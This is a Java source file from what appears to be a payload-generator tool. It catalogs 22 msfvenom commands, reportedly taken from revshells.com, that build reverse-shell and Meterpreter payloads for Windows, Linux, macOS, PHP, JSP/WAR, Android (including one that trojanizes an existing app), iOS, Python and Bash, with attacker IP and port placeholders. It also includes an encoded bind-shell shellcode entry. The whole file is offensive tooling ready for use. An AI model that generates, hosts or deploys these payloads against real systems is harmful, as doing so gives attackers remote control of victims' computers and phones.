package com.crownest.payload;

import java.util.List;

/**
 * The MSFVenom payload commands offered by revshells.com.
 *
 * The templates were extracted verbatim from revshells.com's own data bundle;
 * {ip} and {port} are the placeholders it uses. Each entry also carries the
 * output filename the command produces, so the generator can host the result.
 */
public final class MsfvenomCatalog {

    /** One selectable payload. */
    public record Entry(String name, String template, String output) {
        @Override
        public String toString() {
            return name;
        }
    }

    private MsfvenomCatalog() {
    }

    private static final List<Entry> ENTRIES = List.of(
        new Entry("Windows Meterpreter Staged Reverse TCP (x64)",
            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
            "reverse.exe"),
        new Entry("Windows Meterpreter Stageless Reverse TCP (x64)",
            "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
            "reverse.exe"),
        new Entry("Windows Staged Reverse TCP (x64)",
            "msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
            "reverse.exe"),
        new Entry("Windows Stageless Reverse TCP (x64)",
            "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
            "reverse.exe"),
        new Entry("Windows Staged JSP Reverse TCP",
            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f jsp -o ./rev.jsp",
            "rev.jsp"),
        new Entry("Windows Staged ASPX Reverse TCP",
            "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",
            "reverse.aspx"),
        new Entry("Windows Staged ASPX Reverse TCP (x64)",
            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",
            "reverse.aspx"),
        new Entry("Linux Meterpreter Staged Reverse TCP (x64)",
            "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
            "reverse.elf"),
        new Entry("Linux Stageless Reverse TCP (x64)",
            "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
            "reverse.elf"),
        new Entry("Windows Bind TCP ShellCode - BOF",
            "msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b ' ' "
                + "-f python -v notBuf -o shellcode",
            "shellcode"),
        new Entry("macOS Meterpreter Staged Reverse TCP (x64)",
            "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
            "shell.macho"),
        new Entry("macOS Meterpreter Stageless Reverse TCP (x64)",
            "msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
            "shell.macho"),
        new Entry("macOS Stageless Reverse TCP (x64)",
            "msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
            "shell.macho"),
        new Entry("PHP Meterpreter Stageless Reverse TCP",
            "msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php",
            "shell.php"),
        new Entry("PHP Reverse PHP",
            "msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php",
            "shell.php"),
        new Entry("JSP Stageless Reverse TCP",
            "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp",
            "shell.jsp"),
        new Entry("WAR Stageless Reverse TCP",
            "msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war",
            "shell.war"),
        new Entry("Android Meterpreter Reverse TCP",
            "msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} "
                + "R -o malicious.apk",
            "malicious.apk"),
        new Entry("Android Meterpreter Embed Reverse TCP",
            "msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp "
                + "lhost={ip} lport={port} -o payload.apk",
            "payload.apk"),
        new Entry("Apple iOS Meterpreter Reverse TCP Inline",
            "msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp "
                + "lhost={ip} lport={port} -f macho -o payload",
            "payload"),
        new Entry("Python Stageless Reverse TCP",
            "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw",
            "revshell.py"),
        new Entry("Bash Stageless Reverse TCP",
            "msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh",
            "shell.sh")
    );

    public static List<Entry> entries() {
        return ENTRIES;
    }
}
